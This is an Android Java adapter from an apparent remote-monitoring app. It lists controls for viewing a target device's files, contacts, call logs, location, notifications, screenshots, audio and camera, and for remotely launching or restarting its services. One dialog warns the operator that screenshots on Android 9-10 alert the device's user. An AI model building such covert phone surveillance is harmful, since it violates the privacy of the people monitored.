package com.reiserx.myapplication24.Adapters.Others;

import static android.content.ContentValues.TAG;
import static android.content.Context.MODE_PRIVATE;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.reiserx.myapplication24.Activities.Applist.BlockedApps;
import com.reiserx.myapplication24.Activities.Audios.GetAudiosActivity;
import com.reiserx.myapplication24.Activities.Calls.callogs;
import com.reiserx.myapplication24.Activities.Calls.contacts;
import com.reiserx.myapplication24.Activities.Camera.CameraActivity;
import com.reiserx.myapplication24.Activities.Directories.DirectorysActivity;
import com.reiserx.myapplication24.Activities.Locations.location;
import com.reiserx.myapplication24.Activities.Logs.AppLogsActivity;
import com.reiserx.myapplication24.Activities.Logs.ErrorLogs;
import com.reiserx.myapplication24.Activities.Notifications.NotificationHistoryMain;
import com.reiserx.myapplication24.Activities.Notifications.RecyclerActivity;
import com.reiserx.myapplication24.Activities.Python.Python;
import com.reiserx.myapplication24.Activities.ScreenShots.ScreenShotsActivity;
import com.reiserx.myapplication24.Activities.Usagestats.UsageStatsActivity;
import com.reiserx.myapplication24.Advertisements.InterstitialAdsClass;
import com.reiserx.myapplication24.Advertisements.NativeAdsClass;
import com.reiserx.myapplication24.BackwardCompatibility.RequiresVersion;
import com.reiserx.myapplication24.Classes.postRequest;
import com.reiserx.myapplication24.Models.deviceInfo;
import com.reiserx.myapplication24.Models.operationsModel;
import com.reiserx.myapplication24.Models.performTask;
import com.reiserx.myapplication24.R;
import com.reiserx.myapplication24.databinding.NativeAdsLayoutSmallBinding;
import com.reiserx.myapplication24.databinding.OperationCustomViewBinding;

import java.util.ArrayList;
import java.util.Objects;

public class opeationsAdapter extends RecyclerView.Adapter {

    Context context;
    ArrayList<operationsModel> data;
    private final String UserID;
    performTask performTask;
    int requestCode;

    String title;
    String msg;

    ProgressDialog prog;

    Intent intent;

    final int DATA_CONTENT = 1;
    final int ADS_CONTENT = 2;

    public opeationsAdapter(Context context, ArrayList<operationsModel> data, String userID, ProgressDialog prog) {
        this.context = context;
        this.data = data;
        this.UserID = userID;
        this.prog = prog;
    }

    @NonNull
    @Override
    public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        if (viewType == DATA_CONTENT) {
            View view = LayoutInflater.from(context).inflate(R.layout.operation_custom_view, parent, false);
            return new DataViewHolder(view);
        } else {
            View view = LayoutInflater.from(context).inflate(R.layout.native_ads_layout_small, parent, false);
            return new AdsViewHolder(view);
        }
    }

    @Override
    public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder, int position) {
        operationsModel model = data.get(position);

        if (holder.getClass() == DataViewHolder.class) {
            DataViewHolder viewHolder = (DataViewHolder) holder;
            viewHolder.binding.textView.setText(model.getName());
            viewHolder.binding.getRoot().setOnClickListener(v -> {
            });
            holder.itemView.setOnClickListener(view -> clicked(model.getPosition()));
        } else if (holder.getClass() == AdsViewHolder.class) {
            AdsViewHolder viewHolder = (AdsViewHolder) holder;
            NativeAdsClass nativeAdsClass = new NativeAdsClass(context, viewHolder.binding.myTemplate, viewHolder.binding.nativeAdsHolderSmall);
            nativeAdsClass.loadAd();
        }
    }

    @Override
    public int getItemViewType(int position) {
        if (position == 7 || position == 15) {
            return ADS_CONTENT;
        } else {
            return DATA_CONTENT;
        }
    }

    private void clicked(int position) {
        RequiresVersion requiresVersion = new RequiresVersion(context, UserID);
        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(context);
        switch (position) {
            case 0:
                if (requiresVersion.Requires("2.8")) {
                    performTask = new performTask("Directorys", 1, UserID);
                    performTask.Task();
                    intent = new Intent(context, DirectorysActivity.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                }
                break;
            case 1:
                interstitialAdsClass.loadAds();
                    intent = new Intent(context, contacts.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                break;
            case 2:
                interstitialAdsClass.loadAds();
                intent = new Intent(context, callogs.class);
                intent.putExtra("UserID", UserID);
                context.startActivity(intent);
                break;
            case 3:
                interstitialAdsClass.loadAds();
                intent = new Intent(context, location.class);
                intent.putExtra("UserID", UserID);
                context.startActivity(intent);
                break;
            case 4:
                interstitialAdsClass.loadAds();
                if (requiresVersion.Requires("2.7")) {
                    intent = new Intent(context, NotificationHistoryMain.class);
                    intent.putExtra("UserID", UserID);
                    intent.putExtra("Path", "Main/" + UserID + "/Notification history/AppName");
                    intent.putExtra("status", true);
                    context.startActivity(intent);
                }
                break;
            case 5:
                if (requiresVersion.Requires("3.8")) {
                    ProgressDialog prog = new ProgressDialog(context);
                    prog.setMessage("Processing...");
                    prog.setCancelable(false);
                    prog.show();
                    AlertDialog.Builder alert = new AlertDialog.Builder(context);
                    alert.setTitle("Failed");

                    FirebaseFirestore firestore = FirebaseFirestore.getInstance();
                    CollectionReference document = firestore.collection("Main").document(UserID).collection("DeviceInfo");
                    document.get().addOnCompleteListener(task -> {
                        if (task.isSuccessful()) {
                            for (QueryDocumentSnapshot document1 : task.getResult()) {
                                deviceInfo d = document1.toObject(deviceInfo.class);
                                if (d.getSdk() >= 30) {
                                    interstitialAdsClass.loadAds();
                                    intent = new Intent(context, ScreenShotsActivity.class);
                                    intent.putExtra("UserID", UserID);
                                    context.startActivity(intent);
                                } else if (d.getSdk() >= 28 && d.getSdk() <= 29) {
                                    AlertDialog.Builder dialog = new AlertDialog.Builder(context);
                                    dialog.setMessage("This will take screenshot GLOBALLY in API 28-29 (Android 9-10)\nGLOBALLY means this will take screenshot same as you take it and the user will be notified\nSo be carefull when you use this feature for Android 9-10");
                                    dialog.setTitle("Alert");
                                    dialog.setPositiveButton("NEXT", (dialogInterface, i) -> {
                                        interstitialAdsClass.loadAds();
                                        intent = new Intent(context, ScreenShotsActivity.class);
                                        intent.putExtra("UserID", UserID);
                                        context.startActivity(intent);
                                    });
                                    dialog.setNegativeButton("cancel", null);
                                    dialog.show();
                                } else {
                                    alert.setMessage("This feature requires android SDK version 28, current is "+d.getSdk()+" on target device");
                                    alert.setPositiveButton("ok", null);
                                    alert.show();
                                }
                            }
                            prog.dismiss();
                        } else {
                            prog.dismiss();
                            Toast.makeText(context, String.valueOf(task.getException()), Toast.LENGTH_SHORT).show();
                            Log.d(TAG, "Error getting documents: ", task.getException());
                        }
                    });
                }
                break;
            case 6:
                if (requiresVersion.Requires("3.8")) {
                    interstitialAdsClass.loadAds();
                    intent = new Intent(context, GetAudiosActivity.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                }
                break;
            case 8:
                if (requiresVersion.Requires("3.8")) {
                    interstitialAdsClass.loadAds();
                    intent = new Intent(context, CameraActivity.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                }
                break;
            case 9:
                ClearPreferences();
                break;
            case 10:
                ServiceRestart(UserID);
                break;
            case 11:
                interstitialAdsClass.loadAds();
                intent = new Intent(context, RecyclerActivity.class);
                intent.putExtra("UserID", UserID);
                intent.putExtra("Notification", false);
                context.startActivity(intent);
                break;
            case 12:
                if (requiresVersion.Requires("4.5.0")) {
                    SharedPreferences save = context.getSharedPreferences("blocked", MODE_PRIVATE);
                    SharedPreferences.Editor myEdit = save.edit();
                    myEdit.putString("UserID", UserID);
                    myEdit.apply();
                    intent = new Intent(context, BlockedApps.class);
                    context.startActivity(intent);
                }
                break;
            case 13:
                interstitialAdsClass.loadAds();
                intent = new Intent(context, UsageStatsActivity.class);
                intent.putExtra("UserID", UserID);
                context.startActivity(intent);
                break;
            case 14:
                if (requiresVersion.Requires("4.2")) {
                    interstitialAdsClass.loadAds();
                    intent = new Intent(context, Python.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                }
                break;
            case 16:
                deviceInfo(UserID);
                break;
            case 17:
                if (requiresVersion.Requires("3.8")) {
                    interstitialAdsClass.loadAds();
                    intent = new Intent(context, AppLogsActivity.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                }
                break;
            case 18:
                interstitialAdsClass.loadAds();
                    intent = new Intent(context, ErrorLogs.class);
                    intent.putExtra("UserID", UserID);
                    context.startActivity(intent);
                break;
        }
    }

    @Override
    public int getItemCount() {
        return data.size();
    }

    public class DataViewHolder extends RecyclerView.ViewHolder {

        OperationCustomViewBinding binding;

        public DataViewHolder(@NonNull View itemView) {
            super(itemView);
            binding = OperationCustomViewBinding.bind(itemView);
        }
    }

    public class AdsViewHolder extends RecyclerView.ViewHolder {

        NativeAdsLayoutSmallBinding binding;

        public AdsViewHolder(@NonNull View itemView) {
            super(itemView);
            binding = NativeAdsLayoutSmallBinding.bind(itemView);
        }
    }

    public void ClearPreferences() {
        AlertDialog alert = new AlertDialog.Builder(context).create();

        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(context);

        LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View mView = inflater.inflate(R.layout.preference_dialog, null);
        final Button directorys = mView.findViewById(R.id.directorys);
        final Button upload = mView.findViewById(R.id.upload);
        final Button contacts = mView.findViewById(R.id.contacts);
        final Button callLogs = mView.findViewById(R.id.call_logs);
        final Button cancel = mView.findViewById(R.id.cancel_btn);

        alert.setMessage("This method is used to clear file cache from server that stores which files are loaded or not, CLEAR_PREFERENCE only when you encounter a issue in Directory section, but the best practice is to submit a bug report on http://reiserx.com");

        directorys.setOnClickListener(v1 -> {
            performTask = new performTask("Folders", 5, UserID);
            performTask.Task();
            alert.dismiss();
            interstitialAdsClass.loadAds();
        });
        upload.setOnClickListener(v1 -> {
            performTask = new performTask("uploadFiles", 5, UserID);
            performTask.Task();
            alert.dismiss();
            interstitialAdsClass.loadAds();
        });
        contacts.setOnClickListener(v1 -> {
            performTask = new performTask("Contacts", 5, UserID);
            performTask.Task();
            alert.dismiss();
            interstitialAdsClass.loadAds();
        });
        callLogs.setOnClickListener(v1 -> {
            performTask = new performTask("CallLogs", 5, UserID);
            performTask.Task();
            alert.dismiss();
            interstitialAdsClass.loadAds();
        });
        cancel.setOnClickListener(v1 -> alert.dismiss());
        alert.setView(mView);
        alert.show();
    }

    private void ServiceRestart(String UserID) {

        AlertDialog.Builder alert = new AlertDialog.Builder(context);

        LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View mView = inflater.inflate(R.layout.custum_2_edittext_dialog, null);
        final EditText input = mView.findViewById(R.id.title_text);
        final EditText input2 = mView.findViewById(R.id.msg_text);
        final CheckBox notifyCheckBox = mView.findViewById(R.id.checkBox);
        final CheckBox forgroundCheckBox = mView.findViewById(R.id.checkBox2);
        final CheckBox launch_app = mView.findViewById(R.id.launch_app);
        final CheckBox job = mView.findViewById(R.id.job);

        requestCode = 0;
        alert.setMessage("Enter title and message");
        alert.setTitle("Request service restart");
        alert.setView(mView);

        input.setEnabled(false);
        input2.setEnabled(false);

        notifyCheckBox.setText(R.string.notify);
        notifyCheckBox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (notifyCheckBox.isChecked()) {
                requestCode = 2;
                job.setChecked(false);
                forgroundCheckBox.setChecked(false);
                launch_app.setChecked(false);
                input.setEnabled(true);
                input2.setEnabled(true);
            }
        });
        forgroundCheckBox.setText(R.string.serviceType);
        forgroundCheckBox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (forgroundCheckBox.isChecked()) {
                requestCode = 1;
                notifyCheckBox.setChecked(false);
                job.setChecked(false);
                launch_app.setChecked(false);
                input.setEnabled(false);
                input2.setEnabled(false);
            }
        });
        job.setText(R.string.scheduleJob);
        job.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (job.isChecked()) {
                requestCode = 3;
                notifyCheckBox.setChecked(false);
                forgroundCheckBox.setChecked(false);
                launch_app.setChecked(false);
                input.setEnabled(false);
                input2.setEnabled(false);
            }
        });
        launch_app.setText(R.string.launch_app);
        launch_app.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (launch_app.isChecked()) {
                requestCode = 6;
                notifyCheckBox.setChecked(false);
                forgroundCheckBox.setChecked(false);
                job.setChecked(false);
                input.setEnabled(false);
                input2.setEnabled(false);
            }
        });

        alert.setPositiveButton("SEND", (dialog, whichButton) -> {
            AlertDialog.Builder dialog1 = new AlertDialog.Builder(context);
            dialog1.setTitle("Alert");
            dialog1.setNegativeButton("cancel", null);
            if (requestCode==2) {
                title = input.getText().toString();
                msg = input2.getText().toString();
                dialog1.setMessage("This will send a notification to the target device");
                dialog1.setPositiveButton("send", (dialogInterface, i) -> {
                    if (!title.trim().equals("") && !msg.trim().equals("")) {
                        processNotify(UserID, title, msg);
                    } else {
                        Toast.makeText(context, "Please enter the title and msg", Toast.LENGTH_SHORT).show();
                    }
                });
                dialog1.show();

            } else {
                if (requestCode==6) {
                    dialog1.setMessage("this will launch ReiserX on target device");
                    dialog1.setPositiveButton("launch", (dialogInterface, i) -> {
                        title = "";
                        msg = "";
                        processNotify(UserID, title, msg);
                    });
                    dialog1.show();
                } else {
                    title = "";
                    msg = "";
                    processNotify(UserID, title, msg);
                }
            }

        });

        alert.setNegativeButton("CANCEL", (dialog, whichButton) -> {
        });

        alert.show();
    }

    private void processNotify(String UserID, String title, String msg) {

        prog = new ProgressDialog(context);
        prog.setMessage("Connecting to server...");
        prog.setCancelable(false);
        prog.show();

        getToken(title, msg, UserID);
    }

    private void getToken(String title, String msg, String UserID) {

        prog.setMessage("Getting device id...");

        FirebaseFirestore db = FirebaseFirestore.getInstance();

        CollectionReference docRef = db.collection("Main").document(UserID).collection("TokenUrl");
        docRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                for (QueryDocumentSnapshot document : Objects.requireNonNull(task.getResult())) {
                    postRequest postRequest = new postRequest(String.valueOf(document.getData().get("Notification token")), title, msg, prog, requestCode, context);
                    postRequest.notif();
                }
            } else {
                prog.dismiss();
                Log.d("fbbfbfwfbbff", "Error getting documents: ", task.getException());
                Toast.makeText(context, String.valueOf(task.getException()), Toast.LENGTH_SHORT).show();
            }
        });
    }
    public void deviceInfo(String UserID) {

        AlertDialog.Builder alert = new AlertDialog.Builder(context);
        alert.setTitle("Device Info");

        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(context);

        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        CollectionReference document = firestore.collection("Main").document(UserID).collection("DeviceInfo");
        document.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                for (QueryDocumentSnapshot document1 : task.getResult()) {
                    deviceInfo d = document1.toObject(deviceInfo.class);
                    String message = "SERIAL NO: " + d.getSerial() + "\nID: " + d.getId() + "\nMANUFACTURER: " + d.getManufacturer() + "\nMODEL: " + d.getModel() + "\nUSER: " + d.getUser() + "\nSDK: " + d.getSdk() + "\nVERSION CODE : " + d.getVersionCode();
                    alert.setMessage(message);
                    alert.setPositiveButton("CLOSE", (dialogInterface, i) -> interstitialAdsClass.loadAds());
                    alert.show();
                }
            } else {
                Log.d(TAG, "Error getting documents: ", task.getException());
            }
        });
    }
}